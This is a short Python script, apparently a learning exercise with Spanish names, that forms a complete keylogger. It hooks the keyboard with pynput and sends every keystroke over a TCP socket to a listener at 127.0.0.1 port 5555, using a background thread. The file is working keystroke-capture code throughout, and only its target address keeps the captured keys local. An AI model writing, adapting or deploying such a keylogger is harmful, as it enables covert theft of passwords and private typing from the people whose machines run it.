import socket
from  threading import Thread
from pynput.keyboard import KeyCode, Listener

my_socket= socket.socket()
my_socket.connect(('127.0.0.1',5555))


def escuchar_teclado(key):
	

	key=str(key)

	if key== "Key.space":
		my_socket.send(" ".encode('utf-8'))
	
	elif key != 'Key.enter':

		
		my_socket.send(key.encode('utf-8'))
		
		
	else:
		my_socket.send("\n".encode('utf-8'))

def iniciar_escucha_teclado():
	with Listener(on_press=escuchar_teclado) as l:
		l.join()
		


thread_one=Thread(target=iniciar_escucha_teclado, args=(),)
thread_one.start()
